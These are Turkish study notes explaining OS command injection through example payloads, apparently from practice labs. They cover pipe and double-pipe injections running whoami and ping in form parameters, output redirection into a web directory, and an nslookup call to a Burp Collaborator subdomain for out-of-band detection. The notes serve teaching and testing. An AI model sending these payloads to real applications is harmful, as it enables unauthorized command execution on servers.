# OS Command Injection

- OS Command Injection (Komut Enjeksiyonu), bir saldırganın bir web uygulamasının sistem komutlarını çalıştırmasına izin veren bir güvenlik açığıdır. Bu açık, web uygulamasının kullanıcı girdilerini doğrulamaması veya filtrelememesi nedeniyle ortaya çıkar. Kullanıcı girişi, bir sistem komutunu tetikleyecek şekilde manipüle edilebilir, bu da saldırganın sunucunun işletim sistemini kontrol etmesine olanak tanır.

###### Stock Güncelleme
- `productId=4&storeId=1|whoami`
- Bu istek, `storeId` parametresine `|whoami` komutunu ekliyor. `|` karakteri, bir komutun çıktısını başka bir komuta yönlendiren bir operatördür. Eğer sunucu bu parametreyi düzgün filtrelemezse, `whoami` komutu çalıştırılır ve sistemin hangi kullanıcı altında çalıştığı belirlenir.

###### Feedback Gönderme
- `email=x||ping+-c+10+127.0.0.1||&`
- Burada, `email` parametresine `||ping -c 10 127.0.0.1` eklenmiş. `||` karakteri, önceki komutun çıktısını yok sayarak yeni bir komut çalıştırır. Bu örnekte, `ping` komutu çalıştırılır ve hedef IP adresine ping gönderilir. Bu tür bir saldırı, sunucuda ağ testi yapmak veya sistemdeki zayıflıkları keşfetmek için kullanılabilir.

- `email=||whoami>/var/www/images/output.txt||&`
- Bu istekte, `whoami` komutunun çıktısı, `output.txt` dosyasına yönlendirilmiştir. Eğer sunucu, kullanıcı girdisini düzgün şekilde kontrol etmezse, bu komut çalıştırılabilir ve sistemdeki kullanıcı adı gibi hassas bilgiler `output.txt` dosyasına yazılabilir.

###### DNS Sorgulaması ile OS Command Injection
- `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||&`
- Burada, `email` parametresine `||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN` eklenmiş. `nslookup` komutu, DNS sorgusu yapmak için kullanılır. Bu örnekte, `BURP-COLLABORATOR-SUBDOMAIN` yerine, Burp Suite Collaborator alt alan adı belirtilmiştir. Bu, saldırganın hedef sistemden dışarıya doğru DNS sorgusu yapmasını sağlar ve genellikle hedef sunucunun hangi dış sunuculara sorgu gönderdiğini öğrenmek için kullanılır.